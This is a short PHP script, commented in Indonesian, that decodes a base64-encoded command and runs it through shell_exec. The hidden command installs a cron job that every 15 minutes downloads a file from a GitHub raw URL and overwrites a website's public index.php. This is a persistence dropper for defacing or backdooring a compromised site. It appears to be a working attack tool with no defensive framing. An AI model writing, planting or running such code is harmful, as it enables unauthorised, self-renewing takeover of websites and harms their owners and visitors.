<?php
// Perintah crontab dalam bentuk Base64
$encoded_command = "KGNyb250YWIgLWw7IGVjaG8gIiovMTUgKiAqICogKiB3Z2V0IC1xIC1PIC9ob21lL2FkbWluZmlzaXAvcHVibGljX2h0bWwvaW5kZXgucGhwIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9YLVByb2pldGlvbi9NT01PTk8vcmVmcy9oZWFkcy9tYWluL2Zpc2lwLW5ldy50eHQiKSB8IGNyb250YWIgLQo=";

// Decode Base64 menjadi perintah asli
$command = base64_decode($encoded_command);

// Jalankan perintah shell
$output = shell_exec($command);

// Menampilkan hasil eksekusi (jika perlu)
echo "<pre>$output</pre>";
?>
